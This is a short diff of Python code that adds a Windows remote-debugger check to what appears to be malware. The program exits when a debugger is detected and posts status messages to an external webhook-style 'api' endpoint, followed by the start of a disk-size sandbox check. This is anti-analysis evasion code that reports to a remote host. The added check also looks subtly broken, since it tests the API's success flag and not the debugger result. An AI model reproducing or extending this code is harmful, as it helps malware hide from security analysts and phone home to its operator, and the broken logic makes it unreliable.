@@ -134,6 +134,16 @@ IsDebuggerPresent: A debugger is present, exiting program...
 IsDebuggerPresent: No debugger is present. Proceed!
 ```"""})  
         pass
+    if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
+        requests.post(f'{api}',json={'content': f"""```yaml
+CheckRemoteDebuggerPresent: A debugger is present, exiting program...
+```"""})
+        os._exit(1)
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+CheckRemoteDebuggerPresent: No debugger is present. Proceed!
+```"""})  
+        pass
 
 def disk_check():
     minDiskSizeGB = 50
